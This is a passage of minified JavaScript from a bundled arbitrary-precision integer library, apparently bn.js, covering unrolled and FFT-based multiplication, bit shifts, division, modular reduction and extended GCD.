                $ = $ + Math.imul(ct, Ot) | 0,
                $ = $ + Math.imul(vt, Ct) | 0,
                ie = ie + Math.imul(vt, Ot) | 0,
                re = re + Math.imul(Qe, Pt) | 0,
                $ = $ + Math.imul(Qe, Bt) | 0,
                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
